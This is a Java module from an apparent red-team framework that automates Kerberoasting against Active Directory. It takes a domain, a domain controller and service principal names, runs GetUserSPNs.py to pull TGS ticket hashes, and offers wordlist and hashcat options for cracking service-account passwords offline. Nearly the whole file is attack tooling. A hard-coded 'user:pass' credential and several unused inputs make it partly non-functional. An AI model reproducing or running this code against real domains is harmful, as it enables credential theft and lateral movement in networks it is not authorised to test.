package com.jabber.jrts.modules.lateral;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="lateral-kerberoast",name="Kerberoasting",description="Service account password cracking via TGS ticket extraction",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.MEDIUM,sourceRef="Kerberoasting",author="JRTS")
public class KerberoastingModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.text("domain","Domain").required().placeholder("domain.com").group("Domain"),
            ModuleInputField.text("dc_host","Domain Controller").required().placeholder("dc.domain.com").group("Domain"),
            ModuleInputField.textarea("spn_list","Target SPNs").required().placeholder("MSSQLSvc/server.domain.com:1433\nHTTP/server.domain.com").group("Targets"),
            ModuleInputField.select("extraction_method","Extraction Method",List.of("GetUserSPNs","Rubeus","PowerView")).group("Method"),
            ModuleInputField.text("wordlist","Wordlist Path").placeholder("/usr/share/wordlists/rockyou.txt").group("Cracking"),
            ModuleInputField.checkbox("crack_offline","Offline Cracking").group("Cracking"),
            ModuleInputField.select("hashcat_mode","Hashcat Mode",List.of("13100","1410","1411")).group("Advanced"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-kerberoast");
            try{
                String domain=input.getOrDefault("domain","");
                String dc=input.getOrDefault("dc_host","");
                String spns=input.getOrDefault("spn_list","");

                if(domain.isEmpty()||dc.isEmpty()||spns.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                List<String>spnList=Arrays.asList(spns.split("\n"));

                ctx.log("[*] Kerberoasting Starting...");
                ctx.log("[*] Domain: "+domain);
                ctx.log("[*] DC: "+dc);
                ctx.log("[*] Target SPNs: "+spnList.size());
                ctx.reportProgress(15);

                List<String>tickets=new ArrayList<>();
                for(String spn:spnList){
                    ctx.log("[*] Requesting TGS for: "+spn);
                    String tgs=requestTGS(dc,domain,spn);
                    if(tgs!=null){
                        tickets.add(tgs);
                        ctx.log("[+] TGS extracted");
                    }
                }

                if(tickets.isEmpty()){
                    result.fail("No TGS tickets extracted");return result;
                }
                ctx.log("[+] Extracted "+tickets.size()+" TGS tickets");
                ctx.reportProgress(50);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("domain",domain);
                findings.put("spn_count",spnList.size());
                findings.put("tgs_extracted",tickets.size());
                findings.put("spns",spnList.toString());
                findings.put("tickets_hashes",tickets.toString().substring(0,Math.min(200,tickets.toString().length())));
                findings.put("impact","Service account passwords can be cracked offline");
                findings.put("remediation","Monitor for TGS requests, manage SPN registrations, use strong passwords, enforce MFA");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private String requestTGS(String dc,String domain,String spn){
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"GetUserSPNs.py","-dc-ip",dc,domain.split("\\.")[0]+"/user:pass"});
            Scanner s=new Scanner(p.getInputStream());
            StringBuilder out=new StringBuilder();
            while(s.hasNextLine()){
                String line=s.nextLine();
                if(line.contains(spn)){out.append(line).append("\n");}
            }
            s.close();
            return out.length()>0?out.toString():null;
        }catch(Exception e){return null;}
    }
}
